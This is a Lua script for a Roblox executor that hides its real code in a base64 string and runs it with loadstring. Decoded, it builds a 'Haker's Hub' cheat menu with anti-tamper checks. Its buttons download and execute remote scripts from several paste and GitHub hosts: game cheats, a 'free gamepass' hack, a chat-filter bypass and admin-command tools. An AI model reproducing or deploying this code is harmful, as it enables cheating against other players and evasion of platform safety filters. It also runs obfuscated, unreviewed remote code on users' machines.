local encodedScript = "bG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCgotLSBJbml0aWFsIEFudGktVGFtcGVyIENoZWNrIGluIGEgbGVzcyBvYnZpb3VzIHdheQpsb2NhbCBjcmVkaXRTaWduYXR1cmUgPSAiVGhpcyBzY3JpcHQgd2FzIGNyZWF0ZWQgYnkgSGFrZXIuIENvbnRhY3Qgb24gWW91VHViZSAoSGFrZXIgMSkgb3IgRGlzY29yZCAobG9sZWRlcmcxKS4gUm9ibG94IHByb2ZpbGU6ICdsb2xlZGVyZycuIgppZiBub3QgKHN0cmluZy5maW5kKGNyZWRpdFNpZ25hdHVyZSwgIkhha2VyIikgYW5kIHN0cmluZy5maW5kKGNyZWRpdFNpZ25hdHVyZSwgImxvbGVkZXJnIikpIHRoZW4KICAgIGVycm9yKCJVbmF1dGhvcml6ZWQgbW9kaWZpY2F0aW9uIGRldGVjdGVkLiIpCmVuZAoKbG9jYWwgT3Jpb25MaWIgPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaGxleHdhcmUvT3Jpb24vbWFpbi9zb3VyY2UnKSkpKCkKCmxvY2FsIFdpbmRvdyA9IE9yaW9uTGliOk1ha2VXaW5kb3coe05hbWUgPSAiSGFrZXIncyBIdWIgdjEuMCIsIEhpZGVQcmVtaXVtID0gZmFsc2UsIFNhdmVDb25maWcgPSB0cnVlLCBDb25maWdGb2xkZXIgPSAiT3Jpb25UZXN0In0pCgotLSBBbm90aGVyIEFudGktVGFtcGVyIENoZWNrIHdpdGhpbiBhIGNhbGxiYWNrIGZ1bmN0aW9uCmxvY2FsIGZ1bmN0aW9uIGNoZWNrVGFtcGVyKCkKICAgIGlmIG5vdCAoc3RyaW5nLmZpbmQoY3JlZGl0U2lnbmF0dXJlLCAiSGFrZXIiKSBhbmQgc3RyaW5nLmZpbmQoY3JlZGl0U2lnbmF0dXJlLCAibG9sZWRlcmciKSkgdGhlbgogICAgICAgIGVycm9yKCJVbmF1dGhvcml6ZWQgbW9kaWZpY2F0aW9uIGRldGVjdGVkLiIpCiAgICBlbmQKZW5kCgotLSBHYW1lcyBUYWIKbG9jYWwgVGFiID0gV2luZG93Ok1ha2VUYWIoewogICAgTmFtZSA9ICJHYW1lcyIsCiAgICBJY29uID0gInJieGFzc2V0aWQ6Ly80NDgzMzQ1OTk4IiwKICAgIFByZW1pdW1Pbmx5ID0gZmFsc2UKfSkKClRhYjpBZGRQYXJhZ3JhcGgoIlVwZGF0ZSBOb3RpY2UiLCAiU3RheSB0dW5lZCEgRXhjaXRpbmcgdXBkYXRlcyBhcmUgY29taW5nLiBTaGFyZSB5b3VyIHN1Z2dlc3Rpb25zIGFuZCBzY3JpcHRzIHRvIGFkZCBvbiBZb3VUdWJlISIpCgpsb2NhbCBTZWN0aW9uID0gVGFiOkFkZFNlY3Rpb24oeyBOYW1lID0gIkdhbWVzIFNjcmlwdHMiIH0pCgpUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiUHJpc29uIGxpZmUiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgY2hlY2tUYW1wZXIoKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhd3NjcmlwdHMubmV0L3Jhdy9Qcmlzb24tTGlmZS1aZXBoeXItVjItUHJpczBuLUwxZmUtMTk5MzciKSkoKQogICAgZW5kCn0pCgpUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiQ2hhdCBCeXBhc3MiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgY2hlY2tUYW1wZXIoKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhd3NjcmlwdHMubmV0L3Jhdy9Vbml2ZXJzYWwtU2NyaXB0LUdhemUtYnlwYXNzLUFsdGVyZWQtMjEwODEiKSkoKQogICAgZW5kCn0pCgpUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiRlRGIEFuZCBNTTIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3c2NyaXB0cy5uZXQvcmF3L1VuaXZlcnNhbC1TY3JpcHQtWUFSSE0tMTI0MDMiKSkoKQogICAgZW5kCn0pCgpUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiRnJlZSBHYW1lcGFzcyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kYXJrLW1vZHovNjk4MmRlNDg0NzM1ZTczMDQ5NGIyZDVhMTBmZDZhMmEvcmF3L2E5MjU2M2IwY2Q2YTYzNjgzMzQxYTA5ZjU0YmFjY2VhNTM0OWVkNjkvZmVHYW1lcGFzc1YyIikpKCkKICAgIGVuZAp9KQoKLS0gUGxheWVyIFRhYgpsb2NhbCBUYWIgPSBXaW5kb3c6TWFrZVRhYih7CiAgICBOYW1lID0gIlBsYXllciIsCiAgICBJY29uID0gInJieGFzc2V0aWQ6Ly80NDgzMzQ1OTk4IiwKICAgIFByZW1pdW1Pbmx5ID0gZmFsc2UKfSkKCmxvY2FsIFNlY3Rpb24gPSBUYWI6QWRkU2VjdGlvbih7IE5hbWUgPSAiUGxheWVyIEFkanVzdG1lbnQiIH0pCgpUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiRmx5IEd1aSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXdzY3JpcHRzLm5ldC9yYXcvVW5pdmVyc2FsLVNjcmlwdC1GTFktR1VJLVYzLTgwMzEiKSkoKQogICAgICAgIGNoZWNrVGFtcGVyKCkKICAgIGVuZAp9KQoKVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIlNwZWVkIEd1aSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9wYXN0ZWZ5LmFwcC9TM3FMb0wzZy9yYXciKSkoKQogICAgZW5kCn0pCgpUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiSGl0Ym94IiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGNoZWNrVGFtcGVyKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9zY3JpcHRibG94LmNvbS9yYXcvVW5pdmVyc2FsLVNjcmlwdC1VcGRhdGUtc2NyaXB0LWhpdGJveC05MzI2IikpKCkKICAgIGVuZAp9KQoKLS0gQWRtaW5zIFRhYgpsb2NhbCBUYWIgPSBXaW5kb3c6TWFrZVRhYih7CiAgICBOYW1lID0gIkFkbWlucyIsCiAgICBJY29uID0gInJieGFzc2V0aWQ6Ly80NDgzMzQ1OTk4IiwKICAgIFByZW1pdW1Pbmx5ID0gZmFsc2UKfSkKCmxvY2FsIFNlY3Rpb24gPSBUYWI6QWRkU2VjdGlvbih7IE5hbWUgPSAiQWRtaW5zIiB9KQoKVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkluZmluaXR5IFlpZWxkIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRGFya05ldHdvcmtzL0luZmluaXRlLVlpZWxkL21haW4vbGF0ZXN0Lmx1YScpKSgpCiAgICAgICAgY2hlY2tUYW1wZXIoKQogICAgZW5kCn0pCgpUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiTmFtZWxlc3MiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9GaWx0ZXJpbmdFbmFibGVkL05hbWVsZXNzQWRtaW4vbWFpbi9Tb3VyY2UiKSkoKQogICAgZW5kCn0pCgotLSBJbmZvIFRhYgpsb2NhbCBUYWIgPSBXaW5kb3c6TWFrZVRhYih7CiAgICBOYW1lID0gIkluZm8iLAogICAgSWNvbiA9ICJyYnhhc3NldGlkOi8vNDQ4MzM0NTk5OCIsCiAgICBQcmVtaXVtT25seSA9IGZhbHNlCn0pCgpUYWI6QWRkUGFyYWdyYXBoKCJJbmZvIiwgY3JlZGl0U2lnbmF0dXJlKQoKVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkNsaWNrIHRvIGNvcHkgWW91VHViZSBjaGFubmVsIGxpbmsiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgY2hlY2tUYW1wZXIoKQogICAgICAgIHNldGNsaXBib2FyZCgiaHR0cHM6Ly95b3V0dWJlLmNvbS9ASGFrZXIxXzE0P3NpPUp2c25TaWZJeTRXVWFKeXgiKQogICAgICAgIE9yaW9uTGliOk1ha2VOb3RpZmljYXRpb24oewogICAgICAgICAgICBOYW1lID0gIkNvcGllZCIsCiAgICAgICAgICAgIENvbnRlbnQgPSAiWW91VHViZSBjaGFubmVsIGxpbmsgY29waWVkIHRvIGNsaXBib2FyZCEiLAogICAgICAgICAgICBUaW1lID0gNQogICAgICAgIH0pCiAgICBlbmQKfSkKCmxvY2FsIGh1Yk5hbWUgPSAiSGFrZXIncyBIdWIiCmlmIGh1Yk5hbWUgfj0gIkhha2VyJ3MgSHViIiB0aGVuCiAgICBlcnJvcigiVW5hdXRob3JpemVkIG1vZGlmaWNhdGlvbiBkZXRlY3RlZC4iKQplbmQKClRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJDbGljayB0byBjb3B5IERpc2NvcmQgbGluayIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBzZXRjbGlwYm9hcmQoImh0dHBzOi8vZGlzY29yZC5jb20vdXNlcnMvMTMwNDUzMDMwNTQxOTMxMzE5MyIpCiAgICAgICAgT3Jpb25MaWI6TWFrZU5vdGlmaWNhdGlvbih7CiAgICAgICAgICAgIE5hbWUgPSAiQ29waWVkIiwKICAgICAgICAgICAgQ29udGVudCA9ICJEaXNjb3JkIGxpbmsgY29waWVkIHRvIGNsaXBib2FyZCEiLAogICAgICAgICAgICBUaW1lID0gNQogICAgICAgIH0pCiAgICBlbmQKfSkKCk9yaW9uTGliOkluaXQoKQ=="


local function decodeBase64(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end


local decodedScript = decodeBase64(encodedScript)


loadstring(decodedScript)()
